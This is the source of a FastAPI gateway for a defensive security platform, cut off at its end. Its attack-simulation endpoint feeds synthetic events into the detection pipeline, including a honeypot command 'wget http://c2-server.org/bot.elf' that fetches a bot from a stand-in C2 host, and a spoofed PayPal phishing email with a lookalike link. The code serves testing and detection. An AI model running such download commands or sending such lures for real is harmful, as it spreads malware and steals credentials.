"""
FastAPI gateway for Multi Modal Security.

Provides REST endpoints for querying ingested events, alerts, incidents,
honeypot sessions, attacker behavior clusters, and detection rules, plus
a WebSocket endpoint for live telemetry streaming and an interactive attack simulator.

Run from the project root::

    uvicorn src.api.main:app --reload --port 8000
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import time
from contextlib import asynccontextmanager
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any, Optional

from fastapi import FastAPI, HTTPException, Query, WebSocket, WebSocketDisconnect, Depends
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from opensearchpy import OpenSearch

from src.shared.config import settings
from src.api.auth import router as auth_router, authorize_request, require_analyst, bind_actor, COOKIE_NAME
from src.incident_response.runtime import get_response_service
from src.incident_response.repository import ResponseStoreUnavailable
from src.incident_response.service import ResponseError
from src.auth.models import AuthError, AuthStoreUnavailable, Principal
from src.auth.runtime import get_auth_service
from src.shared.event_schema import Entity, SecurityEvent
from src.reporting import build_incident_report
from src.reporting.threat import build_threat_report
from src.api.reports import ReportFormat, report_response
from src.api.forensics import create_forensics_router
from src.api.threat_intel import router as threat_intel_router
from src.threat_intel.runtime import get_threat_intel
from src.forensics.runtime import get_evidence_vault
from src.soc.detection.rule_loader import RuleLoader
from src.soc.detection.matcher import DetectionEngine
from src.soc.detection.durable import DurableDetectionEngine
from src.soc.detection.anomaly import load_anomaly_config
from src.shared.live_updates import LiveUpdates
from src.soc.correlation.engine import CorrelationEngine
from src.soc.correlation.durable import DurableCorrelationEngine
from src.soc.correlation.repository import PostgresIncidentRepository, IncidentStoreUnavailable
from src.soc.correlation.incident_model import Incident
from src.soc.scoring.calculator import score_incident
from src.soc.alerting.alert_model import Alert
from src.soc.alerting.manager import AlertManager
from src.honeypot.recorder import SessionRecorder
from src.honeypot.server import DeceptionService
from src.honeypot.normalizer import (
    normalise_artifact_record,
    normalise_command_record,
    normalise_credential_attempt,
    normalise_session_to_event,
)
from src.honeypot.behavior import BehaviorAnalyzer
import base64
from src.copilot.history import PastIncidentRetriever, MemoryHistoryStore, PostgresHistoryStore
from src.copilot.models import CopilotQuery
from src.copilot.audit import get_copilot_audit, audit_query, finish_query, CopilotAuditUnavailable
from src.copilot.retrieval import LogRetriever, IncidentRetriever, ThreatIntelRetriever
from src.copilot.report_generator import IncidentReportGenerator
from src.copilot.tools import ToolExecutor, OPENAI_TOOLS
from src.copilot.orchestrator import CopilotOrchestrator
from src.phishing.email_analyzer import EmailAnalyzer, EmailParser
from src.phishing.url_scanner import URLScanner
from src.phishing.attachment_analyzer import AttachmentAnalyzer
from src.phishing.explanation_generator import ExplanationGenerator
from src.phishing.models import PhishingVerdict, ParsedEmail
from src.incident_response import ApprovalStatus, IncidentPhase, ResponseRecommender

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Global In-Memory Pipeline State
# ---------------------------------------------------------------------------

RULES_DIR = Path(__file__).parent.parent / "soc" / "rules"
rule_loader = RuleLoader(rules_dir=RULES_DIR)
loaded_rules = rule_loader.load_from_directory()
anomaly_config = load_anomaly_config()
detection_engine = (DetectionEngine(rules=loaded_rules, anomaly_config=anomaly_config) if settings.incident_storage_mode == "memory" else
    DurableDetectionEngine(loaded_rules, PostgresIncidentRepository(settings.postgres_url, settings.incident_db_schema, settings.storage_timeout_seconds), anomaly_config))
def response_incident_statuses():
    phases = {"new": "open", "investigating": "investigating", "containing": "investigating",
              "contained": "contained", "remediating": "contained", "remediated": "resolved", "closed": "closed"}
    return {record["incident_id"]: phases[record["state"]["phase"]]
            for record in get_response_service().repository.list_records() if record["state"]}


correlation_engine = (CorrelationEngine(correlation_window_seconds=300) if settings.incident_storage_mode == "memory"
    else DurableCorrelationEngine(PostgresIncidentRepository(settings.postgres_url, settings.incident_db_schema,
        settings.storage_timeout_seconds), status_provider=response_incident_statuses))
alert_manager = AlertManager(min_score_to_alert=15.0)

session_recorder = SessionRecorder()
deception_service = DeceptionService(recorder=session_recorder)
behavior_analyzer = BehaviorAnalyzer()

# In-memory recent events ring buffer (for dev fallback when OpenSearch is offline)
RECENT_EVENTS_BUFFER: list[SecurityEvent] = []
MAX_BUFFER_SIZE = 500

# AI Copilot Subsystem Initialization
log_retriever = LogRetriever(opensearch_client=None, memory_buffer=RECENT_EVENTS_BUFFER)
incident_retriever = IncidentRetriever(correlation_engine)
threat_intel_retriever = ThreatIntelRetriever(honeypot_recorder=session_recorder,
    lookup=lambda value, kind=None: get_threat_intel().lookup(value, kind, allow_external=False).model_dump(mode="json"))
report_generator = IncidentReportGenerator(incident_retriever, threat_intel_retriever)
history_store = (MemoryHistoryStore() if settings.copilot_audit_mode == "memory" else
    PostgresHistoryStore(settings.postgres_url, settings.copilot_audit_db_schema, settings.storage_timeout_seconds))
history_retriever = PastIncidentRetriever(lambda: [incident.model_dump(mode="json") for incident in correlation_engine.list_incidents()], history_store)
tool_executor = ToolExecutor(log_retriever, incident_retriever, threat_intel_retriever, report_generator, history_retriever)
copilot_orchestrator = CopilotOrchestrator(tool_executor)

# Phishing Detection Subsystem Initialization
phishing_url_scanner = URLScanner()
phishing_attachment_analyzer = AttachmentAnalyzer()
phishing_explanation_generator = ExplanationGenerator()
phishing_email_analyzer = EmailAnalyzer(
    url_scanner=phishing_url_scanner,
    attachment_analyzer=phishing_attachment_analyzer,
)
phishing_stats = {
    "total_emails_scanned": 0,
    "total_urls_scanned": 0,
    "total_attachments_scanned": 0,
    "phishing_detected_count": 0,
}

# Incident Response Subsystem Initialization
ir_recommender = ResponseRecommender()



# ---------------------------------------------------------------------------
# WebSocket connection manager
# ---------------------------------------------------------------------------


class ConnectionManager:
    """Manages active WebSocket connections for live event streaming."""

    def __init__(self) -> None:
        self._connections: list[WebSocket] = []

    async def connect(self, ws: WebSocket) -> None:
        await ws.accept()
        self._connections.append(ws)
        logger.info("WebSocket client connected (%d total)", len(self._connections))

    def disconnect(self, ws: WebSocket) -> None:
        if ws in self._connections:
            self._connections.remove(ws)
        logger.info("WebSocket client disconnected (%d remaining)", len(self._connections))

    async def broadcast(self, message: str) -> None:
        """Send *message* to all connected clients."""
        dead: list[WebSocket] = []
        for ws in self._connections:
            try:
                await asyncio.to_thread(get_auth_service().authenticate, ws.cookies.get(COOKIE_NAME, ""), False)
                await ws.send_text(message)
            except Exception:
                try:
                    await ws.close(code=1008)
                except Exception:
                    pass
                dead.append(ws)
        for ws in dead:
            if ws in self._connections:
                self._connections.remove(ws)


manager = ConnectionManager()
_live_updates = None

# ---------------------------------------------------------------------------
# Central Event Ingestion Helper
# ---------------------------------------------------------------------------


async def ingest_pipeline_event(event: SecurityEvent) -> dict[str, Any]:
    """Pass an event through detection, correlation, scoring, and alerting."""
    # 1. Buffer event in-memory
    RECENT_EVENTS_BUFFER[:] = [item for item in RECENT_EVENTS_BUFFER if item.event_id != event.event_id]
    RECENT_EVENTS_BUFFER.insert(0, event)
    if len(RECENT_EVENTS_BUFFER) > MAX_BUFFER_SIZE:
        RECENT_EVENTS_BUFFER.pop()

    # 1b. Index into OpenSearch if available
    os_client = _get_os()
    if os_client is not None:
        try:
            os_client.index(
                index=settings.opensearch_events_index,
                id=event.event_id,
                body=event.to_opensearch_doc(),
                refresh=True,
            )
        except Exception as exc:
            if settings.incident_storage_mode == "persistent":
                raise HTTPException(503, "Event indexing unavailable; event remains pending for retry") from exc
            logger.debug("OpenSearch indexing skipped: %s", exc)

    elif settings.incident_storage_mode == "persistent":
        raise HTTPException(503, "Event indexing unavailable; event remains pending for retry")

    # 2. Evaluate detection rules
    matches = detection_engine.evaluate(event)

    # 3. Correlate into an incident
    incident = correlation_engine.process_event(event, rule_matches=matches)

    alert: Optional[Alert] = None
    if incident:
        # 4. Score and alert
        alert = alert_manager.process_incident(incident)

    # 5. Broadcast live message via WebSocket
    payload = {
        "type": "event",
        "event": event.model_dump(mode="json"),
        "rule_matches": [m.model_dump(mode="json") for m in matches],
        "incident_id": incident.incident_id if incident else None,
        "alert": alert.model_dump(mode="json") if alert else None,
        "stats": {
            "active_alerts": alert_manager.alert_count,
            "active_incidents": correlation_engine.active_incident_count,
            "honeypot_sessions": len(session_recorder.get_active_sessions()) + len(session_recorder.get_closed_sessions()),
            "rules_loaded": len(loaded_rules),
            "phishing_scans": (
                phishing_stats["total_emails_scanned"]
                + phishing_stats["total_urls_scanned"]
                + phishing_stats["total_attachments_scanned"]
            ),
        },
    }
    if _live_updates is not None:
        await _live_updates.publish(payload)
    else:
        await manager.broadcast(json.dumps(payload))

    return {
        "event_id": event.event_id,
        "rule_matches": len(matches),
        "incident_id": incident.incident_id if incident else None,
        "alert_id": alert.alert_id if alert else None,
    }


# ---------------------------------------------------------------------------
# Background task: poll Redis Streams and relay to WebSocket clients
# ---------------------------------------------------------------------------

_relay_task: Optional[asyncio.Task] = None


async def _redis_to_websocket_relay() -> None:
    from src.shared.stream_relay import run_gateway_relay
    await run_gateway_relay(settings.redis_url, ingest_pipeline_event)


# ---------------------------------------------------------------------------
# App lifecycle
# ---------------------------------------------------------------------------


@asynccontextmanager
async def lifespan(app: FastAPI):
    """Run ingestion and cross-worker live fan-out with orderly shutdown."""
    global _relay_task, _live_updates
    _live_updates = LiveUpdates(settings.redis_url, manager.broadcast)
    fanout_task = asyncio.create_task(_live_updates.listen())
    _relay_task = asyncio.create_task(_redis_to_websocket_relay())
    try:
        yield
    finally:
        _relay_task.cancel()
        fanout_task.cancel()
        await asyncio.gather(_relay_task, fanout_task, return_exceptions=True)
        await _live_updates.close()
        _live_updates = None


# ---------------------------------------------------------------------------
# FastAPI application
# ---------------------------------------------------------------------------

app = FastAPI(
    title="Multi Modal Security — API Gateway",
    version="0.3.0",
    description="Unified API Gateway for SOC, Honeypot, Correlation, and Risk Scoring.",
    lifespan=lifespan,
    dependencies=[Depends(authorize_request)],
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.auth_allowed_origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.exception_handler(AuthError)
async def auth_error_handler(request, exc):
    return JSONResponse(status_code=exc.status, content={"detail": str(exc)}, headers={"Cache-Control": "no-store"})


@app.exception_handler(ResponseError)
async def response_error_handler(request, exc):
    return JSONResponse(status_code=exc.status, content={"detail": str(exc)})


@app.exception_handler(ResponseStoreUnavailable)
async def response_storage_error_handler(request, exc):
    return JSONResponse(status_code=503, content={"detail": "Response storage unavailable. Execution may already be claimed; refresh its status before retrying."})


@app.exception_handler(IncidentStoreUnavailable)
async def incident_storage_error_handler(request, exc):
    return JSONResponse(status_code=503, content={"detail": "Incident storage unavailable; correlation has not been acknowledged."})


@app.exception_handler(CopilotAuditUnavailable)
async def copilot_audit_error_handler(request, exc):
    return JSONResponse(status_code=503, content={"detail": "Copilot audit storage unavailable; an audited answer cannot be returned."})


@app.exception_handler(AuthStoreUnavailable)
async def auth_storage_error_handler(request, exc):
    return JSONResponse(status_code=503, content={"detail": "Authentication storage unavailable; retry later"})


_os_client: Optional[OpenSearch] = None
_last_os_check: float = 0.0
_OS_CHECK_INTERVAL: float = 15.0


def _get_os() -> Optional[OpenSearch]:
    global _os_client, _last_os_check
    now = time.monotonic()
    if _os_client is not None:
        return _os_client
    if now - _last_os_check < _OS_CHECK_INTERVAL:
        return None
    _last_os_check = now
    try:
        client = OpenSearch(
            hosts=[settings.opensearch_url],
            use_ssl=False,
            verify_certs=False,
            timeout=1,
        )
        if client.ping():
            _os_client = client
            return client
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# REST Endpoints — Telemetry & Events
# ---------------------------------------------------------------------------


app.include_router(create_forensics_router(get_evidence_vault, ingest_pipeline_event))
app.include_router(threat_intel_router)
app.include_router(auth_router)


@app.get("/api/health")
async def health():
    """Liveness check and service status."""
    incidents = correlation_engine.active_incidents
    alert_manager.synchronize(incidents)
    return {
        "status": "ok",
        "service": "mms-api-gateway",
        "rules_loaded": len(loaded_rules),
        "active_incidents": correlation_engine.active_incident_count,
        "active_alerts": alert_manager.alert_count,
        "honeypot_sessions": len(session_recorder.get_active_sessions()) + len(session_recorder.get_closed_sessions()),
        "phishing_scans": (
            phishing_stats["total_emails_scanned"]
            + phishing_stats["total_urls_scanned"]
            + phishing_stats["total_attachments_scanned"]
        ),
    }


@app.get("/api/events")
async def get_events(
    size: int = Query(default=50, ge=1, le=500, description="Number of events to return"),
    source: Optional[str] = Query(default=None, description="Filter by source module"),
    severity: Optional[str] = Query(default=None, description="Filter by severity level"),
    event_type: Optional[str] = Query(default=None, description="Filter by event type"),
):
    """Query recent security events (merging OpenSearch & in-memory buffer)."""
    events_out: list[dict[str, Any]] = []
    total = 0
    os_client = _get_os()
    if os_client is not None:
        index = settings.opensearch_events_index
        must_clauses: list[dict] = []
        if source:
            must_clauses.append({"term": {"source": source}})
        if severity:
            must_clauses.append({"term": {"severity": severity}})
        if event_type:
            must_clauses.append({"term": {"event_type": event_type}})

        body = {
            "query": {"bool": {"must": must_clauses}} if must_clauses else {"match_all": {}},
            "sort": [{"timestamp": {"order": "desc"}}],
            "size": size,
            "track_total_hits": True,
        }
        try:
            result = os_client.search(index=index, body=body)
            hits = result.get("hits", {}).get("hits", [])
            hit_total = result.get("hits", {}).get("total", 0)
            total = hit_total.get("value", 0) if isinstance(hit_total, dict) else hit_total
            events_out = [hit["_source"] for hit in hits]
        except Exception:
            pass

    # In-memory buffer fallback if OpenSearch returned nothing
    if not events_out:
        filtered = RECENT_EVENTS_BUFFER
        if source:
            filtered = [e for e in filtered if e.source == source]
        if severity:
            filtered = [e for e in filtered if e.severity == severity]
        if event_type:
            filtered = [e for e in filtered if e.event_type == event_type]
        events_out = [e.model_dump(mode="json") for e in filtered[:size]]
        total = len(filtered)

    return {"total": total, "count": len(events_out), "events": events_out}


# ---------------------------------------------------------------------------
# REST Endpoints — Phase 2 SOC: Alerts, Incidents, & Rules
# ---------------------------------------------------------------------------


@app.get("/api/alerts")
async def get_alerts(priority: Optional[str] = None):
    """Get deduplicated, scored SOC alerts with full ScoreBreakdown and MITRE tags."""
    alert_manager.synchronize(correlation_engine.active_incidents)
    alerts = alert_manager.get_all_alerts(sort_by_score=True)
    if priority:
        alerts = [a for a in alerts if a.priority == priority]

    return {
        "total": len(alerts),
        "alerts": [a.model_dump(mode="json") for a in alerts],
        "stats": alert_manager.stats,
    }


@app.get("/api/incidents")
async def get_incidents():
    """Get active correlated security incidents with timelines and linked entities."""
    incidents = correlation_engine.active_incidents
    return {
        "total": len(incidents),
        "incidents": [inc.model_dump(mode="json") for inc in incidents],
    }


@app.get("/api/rules")
async def get_rules():
    """List loaded Sigma detection rules."""
    return {
        "count": len(detection_engine.rules),
        "rules": [r.model_dump(mode="json") for r in detection_engine.rules],
        "anomaly_detection": {**anomaly_config.model_dump(), "method": "Per-source/event-type/host bucket counts compared to prior median and scaled MAD; rate anomaly does not prove compromise."},
    }


# ---------------------------------------------------------------------------
# REST Endpoints — Phase 3 Honeypot: Sessions & Attacker Profiles
# ---------------------------------------------------------------------------


@app.get("/api/honeypot/sessions")
async def get_honeypot_sessions():
    """Get all active and historical honeypot deceptive sessions."""
    active = session_recorder.get_active_sessions()
    history = session_recorder.get_closed_sessions()
    all_sessions = active + history
    all_sessions.sort(key=lambda s: s.start_time, reverse=True)

    return {
        "active_count": len(active),
        "closed_count": len(history),
        "total": len(all_sessions),
        "sessions": [s.model_dump(mode="json") for s in all_sessions],
    }


@app.get("/api/honeypot/attackers")
async def get_honeypot_attackers():
    """Get attacker profiles and campaign archetype clusters."""
    all_sessions = session_recorder.get_active_sessions() + session_recorder.get_closed_sessions()
    clusters = behavior_analyzer.cluster_attackers(all_sessions)

    # Serialise clusters
    serialized_clusters = {}
    for arch, profiles in clusters.items():
        serialized_clusters[arch] = [p.model_dump(mode="json") for p in profiles]

    return {
        "clusters": serialized_clusters,
        "statistics": behavior_analyzer.generate_statistics(all_sessions),
    }


# ---------------------------------------------------------------------------
# REST Endpoints — Interactive Simulation
# ---------------------------------------------------------------------------


class SimulationRequest(BaseModel):
    scenario: str = "multistage"
    attacker_ip: str = "203.0.113.88"


@app.post("/api/simulate/attack")
async def simulate_attack(req: SimulationRequest):
    """Trigger a realistic multi-stage attack simulation and push into live pipeline."""
    now = datetime.now(timezone.utc)
    attacker_ip = req.attacker_ip
    events_generated = []

    if req.scenario in ("ssh_brute_force", "multistage"):
        # 1. Failed SSH Attempts (triggers SOC-RULE-001 at 5 attempts)
        for i in range(5):
            ev = SecurityEvent(
                timestamp=now - timedelta(seconds=60 - (i * 2)),
                source="soc",
                severity="medium",
                entity=Entity(ip=attacker_ip, user="root", host="prod-web-01"),
                event_type="auth_failure",
                raw={"service": "sshd", "line": f"Failed password for root from {attacker_ip} attempt {i+1}"},
            )
            res = await ingest_pipeline_event(ev)
            events_generated.append(res)

    if req.scenario in ("sudo_escalation", "multistage"):
        # 2. Successful Login & Sudo Escalation (triggers SOC-RULE-002 and SOC-RULE-005)
        ev_login = SecurityEvent(
            timestamp=now - timedelta(seconds=40),
            source="soc",
            severity="low",
            entity=Entity(ip=attacker_ip, user="root", host="prod-web-01"),
            event_type="session_open",
            raw={"service": "sshd", "line": f"session opened for user root from {attacker_ip}"},
        )
        await ingest_pipeline_event(ev_login)

        ev_sudo = SecurityEvent(
            timestamp=now - timedelta(seconds=30),
            source="soc",
            severity="high",
            entity=Entity(ip=attacker_ip, user="root", host="prod-web-01"),
            event_type="privilege_escalation",
            raw={"service": "sudo", "command": "/bin/bash", "line": "root : COMMAND=/bin/bash"},
        )
        res_sudo = await ingest_pipeline_event(ev_sudo)
        events_generated.append(res_sudo)

    if req.scenario in ("honeypot_pivot", "multistage"):
        # 3. Honeypot Deceptive Interaction (awards MULTI_SOURCE_BONUS)
        start_ts = now - timedelta(seconds=25)
        session = deception_service.handle_connection(
            source_ip=attacker_ip,
            source_port=52341,
            client_version="SSH-2.0-Paramiko_2.8.0",
        )
        session.start_time = start_ts
        deception_service.handle_auth(session.session_id, "admin", "admin123", allow_login=True)
        deception_service.handle_command(session.session_id, "whoami")
        deception_service.handle_command(session.session_id, "wget http://c2-server.org/bot.elf")
        closed = deception_service.handle_disconnect(session.session_id)

        if closed:
            closed.end_time = now
            closed.duration_seconds = 25.0
            ev_hp_cmd = normalise_command_record(closed, closed.commands[0])
            ev_hp_cmd.timestamp = start_ts + timedelta(seconds=5)
            ev_hp_dl = normalise_artifact_record(closed, closed.artifacts[0])
            ev_hp_dl.timestamp = start_ts + timedelta(seconds=12)
            ev_hp_sess = normalise_session_to_event(closed)
            ev_hp_sess.timestamp = now

            await ingest_pipeline_event(ev_hp_cmd)
            await ingest_pipeline_event(ev_hp_dl)
            res_hp = await ingest_pipeline_event(ev_hp_sess)
            events_generated.append(res_hp)

    if req.scenario in ("phishing", "phishing_campaign", "multistage"):
        # 4. Phishing Spearphishing Ingress targeting internal employee
        simulated_phishing_raw = (
            f"From: security-alerts@paypal.com.account-verification.xyz\r\n"
            f"To: analyst@prod-web-01\r\n"
            f"Subject: URGENT: Account Security Breach Detected within 24 hours!\r\n\r\n"
            f"Dear Employee,\r\n\r\n"
            f"Suspicious activity was identified originating from IP {attacker_ip}.\r\n"
            f"You must verify credentials immediately or account access will be terminated:\r\n"
            f"http://xn--pypal-4ve.com/auth/login-verify.exe\r\n\r\n"
            f"Security Operations Center"
        )
        parsed_email = EmailParser.parse_raw_string(simulated_phishing_raw)
        phish_verdict = phishing_email_analyzer.analyze(parsed_email)
        ev_phish = phishing_email_analyzer.to_security_event(phish_verdict, parsed_email)
        # Link entity to attacker IP and targeted host
        ev_phish.entity.ip = attacker_ip
        ev_phish.entity.host = "prod-web-01"
        ev_phish.timestamp = now - timedelta(seconds=10)
        res_phish = await ingest_pipeline_event(ev_phish)
        events_generated.append(res_phish)

    # Return summary of resulting pipeline state
    active_alerts = alert_manager.get_all_alerts(sort_by_score=True)
    return {
        "scenario": req.scenario,
        "attacker_ip": attacker_ip,
        "events_ingested": len(events_generated),
        "total_active_alerts": len(active_alerts),
        "top_alert": active_alerts[0].model_dump(mode="json") if active_alerts else None,
    }


# ---------------------------------------------------------------------------
# REST Endpoints — Phase 4 AI Security Copilot
# ---------------------------------------------------------------------------


@app.post("/api/copilot/chat")
def copilot_chat(query: CopilotQuery, principal: Principal = Depends(require_analyst)):
    """Interact with the AI Security Copilot with RAG and OpenAI tool calling."""
    # Ensure log_retriever has current OpenSearch client connection
    log_retriever.os_client = _get_os()
    from uuid import uuid4
    store = get_copilot_audit()
    audit_id = str(uuid4())
    with audit_query(store, audit_id, principal.username, query):
        resp = copilot_orchestrator.ask(query)
        finish_query(store, audit_id, principal.username, resp)
    return resp.model_dump(mode="json")


@app.get("/api/copilot/audit/{audit_id}")
def copilot_audit_record(audit_id: str, principal: Principal = Depends(authorize_request)):
    entries = get_copilot_audit().read(audit_id)
    if not entries or (principal.role != "admin" and entries[0]["actor"] != principal.username):
        raise HTTPException(404, "Audit record not found")
    return {"audit_id": audit_id, "entries": entries}


@app.get("/api/copilot/tools")
async def get_copilot_tools():
    """List available OpenAI tool calling definitions."""
    return {"count": len(OPENAI_TOOLS), "tools": OPENAI_TOOLS}


@app.get("/api/reports/threats")
def download_threat_report(format: ReportFormat = "json"):
    incidents = [i.model_dump(mode="json") for i in correlation_engine.list_incidents()]
    events = [e.model_dump(mode="json") for e in RECENT_EVENTS_BUFFER]
    return report_response(build_threat_report(incidents, events, MAX_BUFFER_SIZE), format)


@app.get("/api/reports/incidents/{incident_id}")
def download_incident_report(incident_id: str, format: ReportFormat = "json"):
    incident = correlation_engine.get_incident(incident_id)
    record = get_response_service().repository.get(incident_id)
    snapshot = incident.model_dump(mode="json") if incident else (record or {}).get("incident_snapshot")
    if snapshot is None:
        raise HTTPException(status_code=404, detail="Incident not found")
    state = record["state"] if record else None
    return report_response(build_incident_report(snapshot, state), format)


class ReportRequest(BaseModel):
    incident_id: str


@app.post("/api/copilot/reports/generate")
async def generate_incident_report(req: ReportRequest):
    """Generate a structured, evidence-grounded incident report."""
    report = report_generator.generate_report(req.incident_id)
    if not report:
        raise HTTPException(status_code=404, detail=f"Incident '{req.incident_id}' not found")

    return {
        "report": report.model_dump(mode="json"),
        "markdown": report.to_markdown(),
    }


# ---------------------------------------------------------------------------
# REST Endpoints — Phase 5 Phishing Detection
# ---------------------------------------------------------------------------


class URLScanRequest(BaseModel):
    url: str
    source_user: Optional[str] = None
    publish_to_pipeline: bool = True


class EmailScanRequest(BaseModel):
    raw_email: Optional[str] = None
    subject: Optional[str] = None
    sender: Optional[str] = None
    recipient: Optional[str] = None
    body: Optional[str] = None
    publish_to_pipeline: bool = True


class AttachmentScanRequest(BaseModel):
    filename: str
    content_base64: Optional[str] = None
    content_text: Optional[str] = None
    content_type: str = "application/octet-stream"
    source_user: Optional[str] = None
    publish_to_pipeline: bool = True


class ExplainVerdictRequest(BaseModel):
    verdict: PhishingVerdict
    target: Optional[str] = None


class CompositePhishingScanRequest(BaseModel):
    raw_email: Optional[str] = None
    subject: Optional[str] = None
    sender: Optional[str] = None
    recipient: Optional[str] = None
    body: Optional[str] = None
    attachments: list[AttachmentScanRequest] = []
    publish_to_pipeline: bool = True


@app.post("/api/phishing/scan/url")
async def scan_phishing_url(req: URLScanRequest):
    """Scan a target URL for phishing indicators, lookalikes, and threat reputation."""
    if not req.url or not req.url.strip():
        raise HTTPException(status_code=400, detail="Target URL must not be empty.")

    verdict = phishing_url_scanner.scan_url(req.url)
    phishing_stats["total_urls_scanned"] += 1
    if verdict.is_phishing:
        phishing_stats["phishing_detected_count"] += 1

    pipeline_res = None
    if req.publish_to_pipeline:
        event = phishing_url_scanner.to_security_event(verdict, source_user=req.source_user)
        pipeline_res = await ingest_pipeline_event(event)

    return {
        "verdict": verdict.to_dict(),
        "structured_explanation": phishing_explanation_generator.explain(verdict).model_dump(),
        "pipeline": pipeline_res,
    }


@app.post("/api/phishing/scan/email")
async def scan_phishing_email(req: EmailScanRequest):
    """Analyze an email for phishing indicators, header anomalies, brand spoofing, and links."""
    if req.raw_email:
        parsed = EmailParser.parse_raw_string(req.raw_email)
    elif req.body or req.subject or req.sender:
        raw_msg = (
            f"From: {req.sender or 'unknown@external.net'}\r\n"
            f"To: {req.recipient or 'user@target.corp'}\r\n"
            f"Subject: {req.subject or '(No Subject)'}\r\n\r\n"
            f"{req.body or ''}"
        )
        parsed = EmailParser.parse_raw_string(raw_msg)
    else:
        raise HTTPException(status_code=400, detail="Either raw_email or body/subject/sender must be provided.")

    verdict = phishing_email_analyzer.analyze(parsed)
    phishing_stats["total_emails_scanned"] += 1
    if verdict.is_phishing:
        phishing_stats["phishing_detected_count"] += 1

    pipeline_res = None
    if req.publish_to_pipeline:
        event = phishing_email_analyzer.to_security_event(verdict, parsed)
        pipeline_res = await ingest_pipeline_event(event)

    return {
        "verdict": verdict.to_dict(),
        "structured_explanation": phishing_explanation_generator.explain(verdict).model_dump(),
        "pipeline": pipeline_res,
    }


@app.post("/api/phishing/scan/attachment")
async def scan_phishing_attachment(req: AttachmentScanRequest):
    """Statically scan an email attachment (no detonation/execution) for phishing & malware risks."""
    if not req.filename or not req.filename.strip():
        raise HTTPException(status_code=400, detail="Attachment filename must not be empty.")

    if req.content_base64 is not None:
        try:
            raw_bytes = base64.b64decode(req.content_base64, validate=True)
        except Exception:
            raise HTTPException(status_code=400, detail="Invalid base64 payload in content_base64.")
    elif req.content_text is not None:
        raw_bytes = req.content_text.encode("utf-8", errors="replace")
    else:
        raise HTTPException(status_code=400, detail="Either content_base64 or content_text must be provided.")

    scan_res = phishing_attachment_analyzer.scan_bytes_detailed(
        data=raw_bytes,
        filename=req.filename,
        content_type=req.content_type,
    )
    verdict = scan_res.verdict
    phishing_stats["total_attachments_scanned"] += 1
    if verdict.is_phishing:
        phishing_stats["phishing_detected_count"] += 1

    pipeline_res = None
    if req.publish_to_pipeline:
        event = phishing_attachment_analyzer.to_security_event(
            verdict=verdict,
            features=scan_res.features,
            source_user=req.source_user,
        )
        pipeline_res = await ingest_pipeline_event(event)

    return {
        "verdict": verdict.to_dict(),
        "features": scan_res.features.model_dump(),
        "structured_explanation": phishing_explanation_generator.explain(verdict).model_dump(),
        "pipeline": pipeline_res,
    }


@app.post("/api/phishing/explain")
async def explain_phishing_verdict(req: ExplainVerdictRequest):
    """Generate a structured, auditable explanation for an existing PhishingVerdict."""
    structured = phishing_explanation_generator.explain(req.verdict, target=req.target)
    return {"structured_explanation": structured.model_dump()}


@app.post("/api/phishing/scan/composite")
async def scan_phishing_composite(req: CompositePhishingScanRequest):
    """Run email, URL, and static attachment scanners together and return a unified explanation."""
    if req.raw_email:
        parsed = EmailParser.parse_raw_string(req.raw_email)
    elif req.body or req.subject or req.sender:
        raw_msg = (
            f"From: {req.sender or 'unknown@external.net'}\r\n"
            f"To: {req.recipient or 'user@target.corp'}\r\n"
            f"Subject: {req.subject or '(No Subject)'}\r\n\r\n"
            f"{req.body or ''}"
        )
        parsed = EmailParser.parse_raw_string(raw_msg)
    else:
        raise HTTPException(status_code=400, detail="Either raw_email or body/subject/sender must be provided.")

    email_verdict = phishing_email_analyzer.analyze(parsed)
    phishing_stats["total_emails_scanned"] += 1

    url_verdicts: list[PhishingVerdict] = []
    for u in parsed.body.extracted_urls[:10]:
        uv = phishing_url_scanner.scan_url(u)
        url_verdicts.append(uv)
        phishing_stats["total_urls_scanned"] += 1

    attachment_verdicts: list[PhishingVerdict] = []
    for att in req.attachments:
        if att.content_base64 is not None:
            try:
                raw_bytes = base64.b64decode(att.content_base64, validate=True)
            except Exception:
                raise HTTPException(status_code=400, detail=f"Invalid base64 payload for '{att.filename}'.")
        elif att.content_text is not None:
            raw_bytes = att.content_text.encode("utf-8", errors="replace")
        else:
            raw_bytes = b""
        av = phishing_attachment_analyzer.scan_bytes(
            data=raw_bytes,
            filename=att.filename,
            content_type=att.content_type,
            email_id=parsed.email_id,
        )
        attachment_verdicts.append(av)
        phishing_stats["total_attachments_scanned"] += 1

    structured = phishing_explanation_generator.explain_composite(
        email_verdict=email_verdict,
        url_verdicts=url_verdicts,
        attachment_verdicts=attachment_verdicts,
    )
    if structured.is_phishing:
        phishing_stats["phishing_detected_count"] += 1

    pipeline_res = None
    if req.publish_to_pipeline:
        event = phishing_email_analyzer.to_security_event(email_verdict, parsed)
        event.enrichment["composite_score"] = structured.score
        event.enrichment["composite_headline"] = structured.headline
        pipeline_res = await ingest_pipeline_event(event)

    return {
        "email_verdict": email_verdict.to_dict(),
        "url_verdicts": [v.to_dict() for v in url_verdicts],
        "attachment_verdicts": [v.to_dict() for v in attachment_verdicts],
        "structured_explanation": structured.model_dump(),
        "pipeline": pipeline_res,
    }


@app.get("/api/phishing/stats")
async def get_phishing_stats():
    """Get aggregated statistics on phishing scans, cache entries, and detections."""
    provider_name = (
        phishing_url_scanner.threat_intel.__class__.__name__
        if hasattr(phishing_url_scanner, "threat_intel") and phishing_url_scanner.threat_intel
        else "SyntheticBlocklistProvider"
    )
    hash_provider_name = phishing_attachment_analyzer.hash_provider.__class__.__name__
    return {
        "total_emails_scanned": phishing_stats["total_emails_scanned"],
        "total_urls_scanned": phishing_stats["total_urls_scanned"],
        "total_attachments_scanned": phishing_stats["total_attachments_scanned"],
        "phishing_detected_count": phishing_stats["phishing_detected_count"],
        "cache_entries": len(phishing_url_scanner.cache) + len(phishing_attachment_analyzer.cache),
        "threat_intel_providers": [provider_name, hash_provider_name],
    }


# ---------------------------------------------------------------------------
# Incident Response Endpoints (Phase 7)
# ---------------------------------------------------------------------------


class IRApprovalDecisionRequest(BaseModel):
    analyst_id: str | None = None
    reason: str = ""


class IRStateTransitionRequest(BaseModel):
    to_phase: IncidentPhase
